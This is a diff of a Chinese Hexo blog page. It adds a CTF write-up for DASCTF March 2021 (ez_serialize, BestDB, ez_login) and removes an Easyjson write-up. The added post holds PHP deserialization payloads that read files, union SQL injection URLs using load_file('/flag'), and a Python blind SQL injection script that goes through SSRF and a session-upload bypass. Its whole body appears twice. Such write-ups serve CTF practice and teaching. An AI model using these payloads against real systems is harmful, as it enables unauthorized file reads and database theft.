@@ -207,6 +207,456 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/dasctf_web_3.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/dasctf_web_3.html" class="post-title-link" itemprop="url">安恒月赛DASCTF三月娱乐赛</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-03-28 14:13:17 / 修改时间：14:13:22" itemprop="dateCreated datePublished" datetime="2021-03-28T14:13:17+08:00">2021-03-28</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h1><ul>
+<li>这题二血</li>
+</ul>
+<img src="/Users/gqleung/picture/WechatIMG93.png" alt="WechatIMG93" style="zoom: 33%;">
+
+<p>题目直接给出代码，可以动态拼接类。盲猜就是原生类去读文件了。<a href="https://www.php.net/manual/zh/book.spl.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/book.spl.php</a><br>安恒2021三月赛</p>
+<h1 id="ez-serialize-1"><a href="#ez-serialize-1" class="headerlink" title="ez_serialize"></a>ez_serialize</h1><ul>
+<li>这题二血</li>
+</ul>
+<img src="https://goodcheerleung.gitee.io/macpic/WechatIMG93.png" alt="WechatIMG93" style="zoom: 33%;">
+
+<p>题目直接给出代码，可以动态拼接类。盲猜就是原生类去读文件了。<a href="https://www.php.net/manual/zh/book.spl.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/book.spl.php</a></p>
+<p>SLP类中存在能够进行文件处理和迭代的类：</p>
+<table>
+<thead>
+<tr>
+<th>类</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DirectoryIterator</td>
+<td>遍历目录</td>
+</tr>
+<tr>
+<td>FilesystemIterator</td>
+<td>遍历目录</td>
+</tr>
+<tr>
+<td>GlobIterator</td>
+<td>遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*</td>
+</tr>
+<tr>
+<td>SplFileObject</td>
+<td>读取文件，按行读取，多行需要遍历</td>
+</tr>
+<tr>
+<td>finfo/finfo_open()</td>
+<td>需要两个参数</td>
+</tr>
+<tr>
+<td>源码：</td>
+<td></td>
+</tr>
+</tbody></table>
+<pre><code class="php">  &lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+
+class A{
+    public $class;
+    public $para;
+    public $check;
+    public function __construct()
+    {
+        $this-&gt;class = &quot;B&quot;;
+        $this-&gt;para = &quot;ctfer&quot;;
+        echo new  $this-&gt;class ($this-&gt;para);
+    }
+    public function __wakeup()
+    {
+        $this-&gt;check = new C;
+        if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) {
+            echo new  $this-&gt;class ($this-&gt;para);
+        }
+        else
+            die(&#39;bad hacker~&#39;);
+    }
+
+}
+class B{
+    var $a;
+    public function __construct($a)
+    {
+        $this-&gt;a = $a;
+        echo (&quot;hello &quot;.$this-&gt;a);
+    }
+}
+class C{
+
+    function vaild($code){
+        $pattern = &#39;/[!|@|#|$|%|^|&amp;|*|=|\&#39;|&quot;|:|;|?]/i&#39;;
+        if (preg_match($pattern, $code)){
+            return false;
+        }
+        else
+            return true;
+    }
+}
+
+
+if(isset($_GET[&#39;pop&#39;])){
+    unserialize($_GET[&#39;pop&#39;]);
+}
+else{
+    $a=new A;
+
+}  hello ctfer</code></pre>
+<ul>
+<li>直接读取<code>/var/www/html</code>下文件有哪些,得到一个flag所在的文件夹，再遍历这个文件夹发现存在flag.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+class A{
+    public $class=&#39;FilesystemIterator&#39;;
+    public $para=&quot;/var/www/html&quot;;
+    public $check;
+    }
+$o  = new A();
+echo serialize($o);</code></pre>
+<img src="https://goodcheerleung.gitee.io/macpic/WX20210328-135328@2x.png" alt="WX20210328-135328@2x" style="zoom:33%;">
+
+<ul>
+<li>读取flag</li>
+</ul>
+<pre><code class="php">&lt;?php
+class A{
+    public $class=&#39;SplFileObject&#39;;
+    public $para=&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;;
+    public $check;
+    }
+
+$o  = new A();
+echo serialize($o);</code></pre>
+<img src="https://goodcheerleung.gitee.io/macpic/WX20210328-135504@2x.png" alt="WX20210328-135504@2x" style="zoom:33%;">
+
+<h1 id="BestDB"><a href="#BestDB" class="headerlink" title="BestDB"></a>BestDB</h1><p>送分注入,联合注入读文件，注意的是文件在/flag,而非题目提示的flag.txt</p>
+<pre><code class="mysql">http://e4c364fb-d7e4-4a4c-9275-817ebf81e670.machine.dasctf.com/?query=lisi%22%09union%09select%091,2,3%23
+
+http://e4c364fb-d7e4-4a4c-9275-817ebf81e670.machine.dasctf.com/?query=lisi%22%09union%09select%091,(select%09f1agdas%09from%09f1agdas%09where%09id%09=1),3%23
+
+http://e4c364fb-d7e4-4a4c-9275-817ebf81e670.machine.dasctf.com/?query=lisi%22%09union%09select%091,(select%09f1agdas%09from%09f1agdas%09where%09id%09=1),3%23
+
+http://e4c364fb-d7e4-4a4c-9275-817ebf81e670.machine.dasctf.com/?query=lisi%22%09union%09select%09load_file(0x2F666C6167),2,3%23</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG1906.png" alt="WechatIMG1906"></p>
+<h1 id="ez-login"><a href="#ez-login" class="headerlink" title="ez_login"></a>ez_login</h1><p>给出源码：</p>
+<p><strong>Index.php</strong></p>
+<pre><code class="php">&lt;?php
+    if(!isset($_SESSION)){
+        highlight_file(__FILE__);
+        die(&quot;no session&quot;);
+    }
+    include(&quot;./php/check_ip.php&quot;);
+    error_reporting(0);
+    $url = $_GET[&#39;url&#39;];
+    if(check_inner_ip($url)){
+        if($url){
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
+            $output = curl_exec($ch);
+            $result_info = curl_getinfo($ch);
+            curl_close($ch);
+            }
+    }else{
+        echo &quot;Your IP is internal yoyoyo&quot;;
+    }
+?&gt;</code></pre>
+<p><strong>se1f_log3n.php</strong></p>
+<pre><code class="php">&lt;?php
+include(&quot;./php/db.php&quot;);
+include(&quot;./php/check_ip.php&quot;);
+error_reporting(E_ALL);
+$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];
+if($ip !== &quot;127.0.0.1&quot;){
+    exit();
+}else{
+    try{
+    $sql = &#39;SELECT `username`,`password` FROM `user` WHERE `username`= &quot;&#39;.$username.&#39;&quot; and `password`=&quot;&#39;.$password.&#39;&quot;;&#39;;
+    $result = $con-&gt;query($sql);
+    echo $sql;
+    }catch(Exception $e){
+        echo $e-&gt;getMessage();
+    }
+    ($result-&gt;num_rows &gt; 0 AND $row = $result-&gt;fetch_assoc() AND $con-&gt;close() AND die(&quot;error&quot;)) OR ( ($con-&gt;close() AND die(&#39;Try again!&#39;) )); 
+}</code></pre>
+<p>第一点绕过SESSION只需要<code>PHP_SESSION_UPLOAD_PROGRESS</code>就完事了。注入Boo了盲注，去睡了一觉起来做的，时间不够，写出脚本时候靶机已经关闭了。贴一下脚本好了：</p>
+<pre><code class="python"># coding=utf-8
+import io
+import requests
+import threading
+
+tables = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-}{&#39;
+flag = &#39;&#39;
+sessid = &#39;flag&#39;
+for i in range(1,70):
+    for j in tables:
+        url = &quot;http://6ac49c07-405e-454b-8b76-50c4b3adb45d.machine.dasctf.com/?url=http://localhost/se1f_Log3n.php?username=admin&#39; password regexp binary %s-- #&amp;password=admin&quot;%(j)
+        f = io.BytesIO(b&#39;a&#39; * 1024 * 50)
+        session = requests.session()
+        resp = session.post(url,data={&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;x&#39;},files={&#39;file&#39;: (&#39;tgao.txt&#39;, f)}, cookies={&#39;PHPSESSID&#39;: sessid})
+        if &#39;wrong&#39; not in resp.text:
+            flag = flag +j
+            print(j)</code></pre>
+<p>SLP类中存在能够进行文件处理和迭代的类：</p>
+<table>
+<thead>
+<tr>
+<th>类</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DirectoryIterator</td>
+<td>遍历目录</td>
+</tr>
+<tr>
+<td>FilesystemIterator</td>
+<td>遍历目录</td>
+</tr>
+<tr>
+<td>GlobIterator</td>
+<td>遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*</td>
+</tr>
+<tr>
+<td>SplFileObject</td>
+<td>读取文件，按行读取，多行需要遍历</td>
+</tr>
+<tr>
+<td>finfo/finfo_open()</td>
+<td>需要两个参数</td>
+</tr>
+<tr>
+<td>源码：</td>
+<td></td>
+</tr>
+</tbody></table>
+<pre><code class="php">  &lt;?php
+error_reporting(0);
+highlight_file(__FILE__);
+
+class A{
+    public $class;
+    public $para;
+    public $check;
+    public function __construct()
+    {
+        $this-&gt;class = &quot;B&quot;;
+        $this-&gt;para = &quot;ctfer&quot;;
+        echo new  $this-&gt;class ($this-&gt;para);
+    }
+    public function __wakeup()
+    {
+        $this-&gt;check = new C;
+        if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) {
+            echo new  $this-&gt;class ($this-&gt;para);
+        }
+        else
+            die(&#39;bad hacker~&#39;);
+    }
+
+}
+class B{
+    var $a;
+    public function __construct($a)
+    {
+        $this-&gt;a = $a;
+        echo (&quot;hello &quot;.$this-&gt;a);
+    }
+}
+class C{
+
+    function vaild($code){
+        $pattern = &#39;/[!|@|#|$|%|^|&amp;|*|=|\&#39;|&quot;|:|;|?]/i&#39;;
+        if (preg_match($pattern, $code)){
+            return false;
+        }
+        else
+            return true;
+    }
+}
+
+
+if(isset($_GET[&#39;pop&#39;])){
+    unserialize($_GET[&#39;pop&#39;]);
+}
+else{
+    $a=new A;
+
+}  hello ctfer</code></pre>
+<ul>
+<li>直接读取<code>/var/www/html</code>下文件有哪些,得到一个flag所在的文件夹，再遍历这个文件夹发现存在flag.php</li>
+</ul>
+<pre><code class="php">&lt;?php
+class A{
+    public $class=&#39;FilesystemIterator&#39;;
+    public $para=&quot;/var/www/html&quot;;
+    public $check;
+    }
+$o  = new A();
+echo serialize($o);</code></pre>
+<img src="/Users/gqleung/picture/WX20210328-135328@2x.png" alt="WX20210328-135328@2x" style="zoom:33%;">
+
+<ul>
+<li>读取flag</li>
+</ul>
+<pre><code class="php">&lt;?php
+class A{
+    public $class=&#39;SplFileObject&#39;;
+    public $para=&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;;
+    public $check;
+    }
+
+$o  = new A();
+echo serialize($o);</code></pre>
+<img src="/Users/gqleung/picture/WX20210328-135504@2x.png" alt="WX20210328-135504@2x" style="zoom:33%;">
+
+<h1 id="BestDB-1"><a href="#BestDB-1" class="headerlink" title="BestDB"></a>BestDB</h1><p>送分注入,联合注入读文件，注意的是文件在/flag,而非题目提示的flag.txt</p>
+<pre><code class="mysql">http://e4c364fb-d7e4-4a4c-9275-817ebf81e670.machine.dasctf.com/?query=lisi%22%09union%09select%091,2,3%23
+
+http://e4c364fb-d7e4-4a4c-9275-817ebf81e670.machine.dasctf.com/?query=lisi%22%09union%09select%091,(select%09f1agdas%09from%09f1agdas%09where%09id%09=1),3%23
+
+http://e4c364fb-d7e4-4a4c-9275-817ebf81e670.machine.dasctf.com/?query=lisi%22%09union%09select%091,(select%09f1agdas%09from%09f1agdas%09where%09id%09=1),3%23
+
+http://e4c364fb-d7e4-4a4c-9275-817ebf81e670.machine.dasctf.com/?query=lisi%22%09union%09select%09load_file(0x2F666C6167),2,3%23</code></pre>
+<p><img src="/Users/gqleung/picture/WechatIMG1906.png" alt="WechatIMG1906"></p>
+<h1 id="ez-login-1"><a href="#ez-login-1" class="headerlink" title="ez_login"></a>ez_login</h1><p>给出源码：</p>
+<p><strong>Index.php</strong></p>
+<pre><code class="php">&lt;?php
+    if(!isset($_SESSION)){
+        highlight_file(__FILE__);
+        die(&quot;no session&quot;);
+    }
+    include(&quot;./php/check_ip.php&quot;);
+    error_reporting(0);
+    $url = $_GET[&#39;url&#39;];
+    if(check_inner_ip($url)){
+        if($url){
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
+            $output = curl_exec($ch);
+            $result_info = curl_getinfo($ch);
+            curl_close($ch);
+            }
+    }else{
+        echo &quot;Your IP is internal yoyoyo&quot;;
+    }
+?&gt;</code></pre>
+<p><strong>se1f_log3n.php</strong></p>
+<pre><code class="php">&lt;?php
+include(&quot;./php/db.php&quot;);
+include(&quot;./php/check_ip.php&quot;);
+error_reporting(E_ALL);
+$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];
+if($ip !== &quot;127.0.0.1&quot;){
+    exit();
+}else{
+    try{
+    $sql = &#39;SELECT `username`,`password` FROM `user` WHERE `username`= &quot;&#39;.$username.&#39;&quot; and `password`=&quot;&#39;.$password.&#39;&quot;;&#39;;
+    $result = $con-&gt;query($sql);
+    echo $sql;
+    }catch(Exception $e){
+        echo $e-&gt;getMessage();
+    }
+    ($result-&gt;num_rows &gt; 0 AND $row = $result-&gt;fetch_assoc() AND $con-&gt;close() AND die(&quot;error&quot;)) OR ( ($con-&gt;close() AND die(&#39;Try again!&#39;) )); 
+}</code></pre>
+<p>第一点绕过SESSION只需要<code>PHP_SESSION_UPLOAD_PROGRESS</code>就完事了。注入Boo了盲注，去睡了一觉起来做的，时间不够，写出脚本时候靶机已经关闭了。贴一下脚本好了：</p>
+<pre><code class="python"># coding=utf-8
+import io
+import requests
+import threading
+
+tables = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-}{&#39;
+flag = &#39;&#39;
+sessid = &#39;flag&#39;
+for i in range(1,70):
+    for j in tables:
+        url = &quot;http://6ac49c07-405e-454b-8b76-50c4b3adb45d.machine.dasctf.com/?url=http://localhost/se1f_Log3n.php?username=admin&#39; password regexp binary %s-- #&amp;password=admin&quot;%(j)
+        f = io.BytesIO(b&#39;a&#39; * 1024 * 50)
+        session = requests.session()
+        resp = session.post(url,data={&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;x&#39;},files={&#39;file&#39;: (&#39;tgao.txt&#39;, f)}, cookies={&#39;PHPSESSID&#39;: sessid})
+        if &#39;wrong&#39; not in resp.text:
+            flag = flag +j
+            print(j)</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/spatial_functions_blind_inject.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2037,229 +2487,6 @@ echo $open_php;
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d611bed02b.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/header.jpg">
-      <meta itemprop="name" content="XiaoLeung">
-      <meta itemprop="description" content="随笔、分享、记录生活">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Xiao Leung's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/articles/d611bed02b.html" class="post-title-link" itemprop="url">西湖论剑Easyjson Write up</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-10-09 14:33:08" itemprop="dateCreated datePublished" datetime="2020-10-09T14:33:08+08:00">2020-10-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:04:36" itemprop="dateModified" datetime="2020-10-14T17:04:36+08:00">2020-10-14</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>3.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>太菜了只做了一道</p>
-</blockquote>
-<h2 id="Easyjson"><a href="#Easyjson" class="headerlink" title="Easyjson"></a>Easyjson</h2><ul>
-<li>代码审计</li>
-</ul>
-<pre><code class="php"> &lt;?php
-include &#39;security.php&#39;;
-
-if(!isset($_GET[&#39;source&#39;])){
-    show_source(__FILE__);
-    die();
-}
-$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;
-var_dump($sandbox);
-if(!file_exists($sandbox)){
-    mkdir($sandbox);
-    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);
-}
-$action = $_GET[&#39;action&#39;];
-$content = file_get_contents(&quot;php://input&quot;);
-
-
-if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
-    $content = json_decode($content);
-    $filename = $_GET[&#39;filename&#39;];
-    $filecontent = $content-&gt;content;
-    $filename = $sandbox.$filename;
-    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
-}elseif($action == &quot;reset&quot;){
-    $files = scandir($sandbox);
-    foreach($files as $file) {
-        if(!is_dir($file)){
-            if($file !== &quot;index.php&quot;){
-                unlink($sandbox.$file);
-            }
-        }
-    }
-}
-else{
-    die(&#39;Security Check Failed.&#39;);
-}
-</code></pre>
-<ul>
-<li>代码主要部分在,但是这里有一个waf对文件名和content参数进行过滤。简单Fuzz了一下，filename可以使用php后缀，说明可以写php文件，但是有一个很关键的问题就是<code>content</code>它传来必须是一个json,json中有一个属性是content，例如：<code>{&#39;content&#39;:&#39;&lt;?=phpinfo()?&gt;&#39;}</code>但是<code>waf</code>对json进行了过滤，不能存在content这个字符串(还过滤了其他关键字)。</li>
-</ul>
-<pre><code class="php">if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
-    $content = json_decode($content);
-    $filename = $_GET[&#39;filename&#39;];
-    $filecontent = $content-&gt;content;
-    $filename = $sandbox.$filename;
-    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
-}</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001234@2x.png" alt="WX20201009-001234@2x"></p>
-<ul>
-<li>神小密圈发现，json支持的字符中可以支持unicode编码，那么我们全都用unicode编码来代替字符串不就行了？</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG59.jpeg" alt="WechatIMG59"></p>
-<ul>
-<li>简单测试一下发现可以.<a href="https://blog.csdn.net/weixin_30654419/article/details/97554779?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param" target="_blank" rel="noopener">Unicode表</a></li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG72.png" alt="WechatIMG72"></p>
-<ul>
-<li>简单写个脚本来将字符串转化为unicode编码。</li>
-</ul>
-<pre><code class="php">&lt;?php
-
-function unicode_encode($str){
-    $table = [
-            &#39;\u002&#39;=&gt;[&#39; &#39;,&#39;!&#39;,&#39;&quot;&#39;,&#39;#&#39;,&#39;$&#39;,&#39;%&#39;,&#39;&amp;&#39;,&#39;\&#39;&#39;,&#39;(&#39;,&#39;)&#39;,&#39;*&#39;,&#39;+&#39;,&#39;,&#39;,&#39;-&#39;,&#39;.&#39;,&#39;/&#39;],
-            &#39;\u003&#39;=&gt;[&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;:&#39;,&#39;;&#39;,&#39;&lt;&#39;,&#39;=&#39;,&#39;&gt;&#39;,&#39;?&#39;],
-            &#39;\u004&#39;=&gt;[&#39;@&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;],
-            &#39;\u005&#39;=&gt;[&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;[&#39;,&#39;\\&#39;,&#39;]&#39;,&#39;^&#39;,&#39;_&#39;],
-            &#39;\u006&#39;=&gt;[&#39;`&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;],
-            &#39;\u007&#39;=&gt;[&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;{&#39;,&#39;|&#39;,&#39;}&#39;,&#39;~&#39;]
-];
-    foreach ($table as $key =&gt; $value) {
-        $i = 0;
-        foreach ($value as $vcode) {
-            $i=$i+1;
-            if($str==$vcode){
-                return $key.bin2e($i-1);
-            }
-
-        }
-    }
-
-}
-
-function bin2e($str){
-    switch ($str) {
-        case &#39;10&#39;:
-            return &#39;a&#39;;
-            break;
-        case &#39;11&#39;:
-            return &#39;b&#39;;
-            break;
-        case &#39;12&#39;:
-            return &#39;c&#39;;
-            break;
-        case &#39;13&#39;:
-            return &#39;d&#39;;
-            break;
-        case &#39;14&#39;:
-            return &#39;e&#39;;
-            break;
-        case &#39;15&#39;:
-            return &#39;f&#39;;
-            break;
-        default:
-            return $str;
-            break;
-    }
-}
-
-function main($str){
-for($i=0;$i&lt;strlen($str);$i++){
-    echo unicode_encode($str[$i]);
-}
-}
-
-
-main(&#39;&lt;?=phpinfo()?&gt;&#39;);
-?&gt;</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000458@2x.png" alt="WX20201009-000458@2x"></p>
-<ul>
-<li>EXP</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000600@2x.png" alt="WX20201009-000600@2x"></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000806@2x.png" alt="WX20201009-000806@2x"></p>
-<ul>
-<li>Getflag</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001124@2x.png" alt="WX20201009-001124@2x"></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001031@2x.png" alt></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000938@2x.png" alt="WX20201009-000938@2x"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/2a808de4a49b19.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2535,7 +2762,7 @@ main(&#39;&lt;?=phpinfo()?&gt;&#39;);
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">69</span>
+          <span class="site-state-item-count">70</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2606,12 +2833,12 @@ main(&#39;&lt;?=phpinfo()?&gt;&#39;);
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">253k</span>
+    <span title="站点总字数">261k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:50</span>
+    <span title="站点阅读时长">3:57</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
